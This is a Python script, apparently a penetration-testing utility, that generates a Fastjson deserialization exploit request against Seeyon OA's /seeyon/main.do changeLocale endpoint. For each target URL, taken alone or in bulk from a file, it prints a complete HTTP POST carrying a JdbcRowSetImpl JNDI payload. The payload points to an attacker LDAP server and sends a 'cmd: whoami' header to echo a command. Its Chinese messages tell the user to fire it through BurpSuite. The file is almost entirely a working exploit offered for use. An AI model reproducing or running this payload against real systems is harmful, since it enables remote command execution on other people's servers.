import time
import argparse
import multiprocessing
from rich.console import Console

console = Console()


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:5] == 'https':
        target_url = target_url[8:]
    if target_url[:4] == 'http':
        target_url = target_url[7:]
    if target_url[-1] == '/':
        target_url = target_url[:-1]
    console.print(now_time() + ' [INFO]     正在生成致远OA Fastjson 反序列化漏洞Payload', style='bold blue')
    console.print(now_time() + ' [INFO]     请手动检测致远OA Fastjson 反序列化漏洞, 复制以下Payload, 替换ldap链接到BurpSuite中发包测试',
                  style='bold blue')
    console.print('''
POST /seeyon/main.do?method=changeLocale HTTP/1.1
Host: ''' + target_url + '''
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
cmd: whoami

_json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x.x.x.x:1389/TomcatBypass/TomcatEcho","autoCommit":true}}
   ''', style='bold blue')


if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.console.print('\nCTRL+C 退出', style='reverse bold red')
